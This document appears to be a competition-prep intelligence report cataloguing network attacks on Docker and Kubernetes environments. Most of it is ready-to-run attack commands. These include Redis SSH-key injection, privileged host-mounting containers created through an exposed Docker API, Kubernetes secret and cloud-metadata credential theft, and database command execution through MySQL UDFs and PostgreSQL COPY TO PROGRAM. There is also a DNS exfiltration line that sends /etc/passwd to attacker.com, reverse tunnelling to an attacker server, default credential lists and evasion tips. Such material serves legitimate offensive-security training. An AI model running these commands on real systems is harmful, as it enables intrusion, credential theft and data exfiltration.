# Network Attack Vectors Intelligence Report

**Classification:** CPTC Competition Preparation
**Date:** January 2026
**Analyst:** Docker Threat Intel Team

---

## Executive Summary

This report catalogs network-based attack vectors commonly encountered in containerized environments and penetration testing competitions. Focus areas include service exploitation, lateral movement, and privilege escalation through network-accessible services.

---

## 1. Common Network Vulnerabilities

### 1.1 Exposed Management Interfaces

| Service | Default Port | Risk Level | Attack Vector |
|---------|--------------|------------|---------------|
| Docker API | 2375/2376 | Critical | Unauthenticated container control |
| Kubernetes API | 6443/8443 | Critical | Cluster compromise |
| etcd | 2379/2380 | Critical | Secret extraction |
| Portainer | 9000 | High | Web UI exploitation |
| cAdvisor | 8080 | Medium | Information disclosure |
| Prometheus | 9090 | Medium | Metrics/config exposure |
| Grafana | 3000 | High | Auth bypass, SSRF |

### 1.2 Default Credential Targets

```
Service              Default Credentials
-----------------------------------------
Portainer            admin:admin (first setup)
Grafana              admin:admin
Jenkins              admin:admin
Tomcat Manager       tomcat:tomcat, admin:admin
phpMyAdmin           root:(empty)
MongoDB              (no auth by default)
Redis                (no auth by default)
Elasticsearch        (no auth < 7.x)
```

### 1.3 Unauthenticated Service Access

**Redis (Port 6379)**
```bash
# Check for open Redis
redis-cli -h target INFO
redis-cli -h target CONFIG GET dir
redis-cli -h target KEYS *

# SSH key injection
redis-cli -h target FLUSHALL
redis-cli -h target SET test "\\n\\nssh-rsa AAAA...\\n\\n"
redis-cli -h target CONFIG SET dir /root/.ssh
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SAVE
```

**MongoDB (Port 27017)**
```bash
# Enumerate databases
mongo --host target --eval "db.adminCommand('listDatabases')"

# Dump credentials
mongodump --host target --out /tmp/dump
```

**Elasticsearch (Port 9200)**
```bash
# Cluster info
curl http://target:9200

# List indices
curl http://target:9200/_cat/indices

# Search all data
curl http://target:9200/_search?pretty
```

---

## 2. Service-Specific Attack Techniques

### 2.1 Web Application Attacks

**Server-Side Request Forgery (SSRF)**
- Target internal services via web applications
- Access cloud metadata endpoints
- Reach Docker API from web container

```bash
# Common SSRF targets in containerized environments
http://169.254.169.254/latest/meta-data/    # AWS metadata
http://metadata.google.internal/             # GCP metadata
http://localhost:2375/containers/json        # Docker API
http://kubernetes.default.svc/               # K8s API
```

**SQL Injection**
- Database credential extraction
- File read/write operations
- Command execution via UDF

**Command Injection**
- Container breakout via exec functions
- Reverse shell establishment
- Environment variable disclosure

### 2.2 API Exploitation

**Docker Remote API**
```bash
# List containers
curl http://target:2375/containers/json

# Create malicious container
curl -X POST -H "Content-Type: application/json" \
  http://target:2375/containers/create \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'

# Start and attach
curl -X POST http://target:2375/containers/{id}/start
```

**Kubernetes API**
```bash
# With token
curl -k -H "Authorization: Bearer $TOKEN" \
  https://target:6443/api/v1/namespaces/default/pods

# List secrets
curl -k -H "Authorization: Bearer $TOKEN" \
  https://target:6443/api/v1/namespaces/default/secrets
```

### 2.3 Message Queue Attacks

**RabbitMQ (Ports 5672, 15672)**
```bash
# Default credentials: guest:guest
# Management API enumeration
curl -u guest:guest http://target:15672/api/overview
curl -u guest:guest http://target:15672/api/queues
```

**Kafka (Port 9092)**
- No authentication by default
- Message interception
- Topic enumeration

---

## 3. Lateral Movement Patterns

### 3.1 Container-to-Container Movement

**Via Shared Networks**
```bash
# Discover other containers on same network
for i in $(seq 1 254); do
  ping -c 1 172.17.0.$i 2>/dev/null && echo "172.17.0.$i alive"
done

# ARP scan
arp-scan --interface=eth0 --localnet
```

**Via Service Discovery**
```bash
# DNS enumeration in Docker networks
dig @127.0.0.11 +short any *.docker.internal

# Kubernetes service discovery
nslookup kubernetes.default.svc.cluster.local
```

### 3.2 Container-to-Host Movement

**Path 1: Docker Socket**
- Mount socket found in container
- Create privileged container
- Access host filesystem

**Path 2: Kernel Exploit**
- Identify kernel version
- Deploy container escape exploit
- Gain host root access

**Path 3: Network Pivot**
- Use container as pivot point
- Access host-only services
- Attack management interfaces

### 3.3 Network Pivoting Techniques

```bash
# SSH tunneling from compromised container
ssh -L 8080:internal-host:80 user@pivot

# Chisel for HTTP tunneling
# Server (attacker)
chisel server -p 8000 --reverse

# Client (compromised container)
chisel client attacker:8000 R:socks
```

**Proxychains Configuration**
```
# /etc/proxychains.conf
socks5 127.0.0.1 1080
```

---

## 4. Privilege Escalation Paths

### 4.1 Network-Based Privilege Escalation

**NFS Misconfiguration**
```bash
# Check for NFS exports
showmount -e target

# Mount with no_root_squash
mount -t nfs target:/share /mnt
# If no_root_squash, can create SUID binaries
```

**LDAP/Active Directory**
```bash
# LDAP enumeration
ldapsearch -x -H ldap://target -b "dc=domain,dc=com"

# Kerberoasting
GetUserSPNs.py -request -dc-ip target domain/user:password
```

### 4.2 Service Account Abuse

**Kubernetes ServiceAccount Tokens**
```bash
# Token location in pods
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Enumerate permissions
kubectl auth can-i --list
```

**AWS IAM Role via SSRF**
```bash
# Get role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### 4.3 Database Privilege Escalation

**MySQL UDF Exploitation**
```sql
-- Create UDF for command execution
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/out');
```

**PostgreSQL RCE**
```sql
-- COPY to program (9.3+)
COPY (SELECT '') TO PROGRAM 'id > /tmp/out';

-- Large object methods
SELECT lo_import('/etc/passwd');
```

---

## 5. Protocol-Specific Attacks

### 5.1 DNS Attacks

**DNS Rebinding**
- Bypass same-origin policy
- Access internal services
- Docker DNS resolver exploitation

**DNS Exfiltration**
```bash
# Exfiltrate data via DNS queries
cat /etc/passwd | base64 | xargs -I{} dig {}.attacker.com
```

### 5.2 SSL/TLS Attacks

**Certificate Validation Bypass**
- Self-signed certificate acceptance
- Expired certificate exploitation
- SNI-based routing abuse

**Protocol Downgrade**
- Force HTTP from HTTPS
- SSLStrip in container networks

### 5.3 Container Network Protocol Abuse

**ARP Spoofing**
```bash
# Within container network
arpspoof -i eth0 -t target gateway
```

**VXLAN/Overlay Network Attacks**
- VXLAN injection
- Overlay network pivoting
- Container network namespace escape

---

## 6. Reconnaissance Methodology

### 6.1 Network Discovery

```bash
# Fast network scan
nmap -sn -T4 172.17.0.0/24

# Service enumeration
nmap -sV -sC -p- --min-rate 1000 target

# Container-specific ports
nmap -p 2375,2376,4243,6443,8443,9000,10250,10255 target
```

### 6.2 Service Fingerprinting

```bash
# Banner grabbing
nc -nv target 22
curl -I http://target

# SSL certificate inspection
openssl s_client -connect target:443 | openssl x509 -noout -text
```

### 6.3 Vulnerability Scanning

```bash
# Nmap vulnerability scripts
nmap --script vuln target

# Nuclei for container CVEs
nuclei -u http://target -t cves/

# Docker-specific
docker-bench-security
```

---

## 7. Defense Evasion

### 7.1 Traffic Obfuscation

- Use DNS tunneling for C2
- HTTP/HTTPS for blending
- Legitimate ports (80, 443, 53)

### 7.2 Timing Attacks

- Slow scanning to avoid detection
- Random delays between requests
- Business hours operation

### 7.3 Protocol Abuse

- Use allowed protocols for tunneling
- Encapsulate traffic in legitimate services
- Leverage existing application traffic

---

## 8. Tool Recommendations

### 8.1 Network Reconnaissance
- nmap with container-specific scripts
- masscan for fast port discovery
- netcat for manual probing

### 8.2 Exploitation
- Metasploit modules for common services
- Custom Docker API exploitation scripts
- Kubernetes attack tools (kube-hunter, peirates)

### 8.3 Post-Exploitation
- Chisel for tunneling
- Ligolo-ng for pivoting
- Sliver/Cobalt Strike for C2

---

## 9. References

- OWASP Testing Guide
- PTES (Penetration Testing Execution Standard)
- NIST Cybersecurity Framework
- Docker Security Best Practices
- Kubernetes Security Documentation

---

**Document Version:** 1.0
**Next Review:** Quarterly
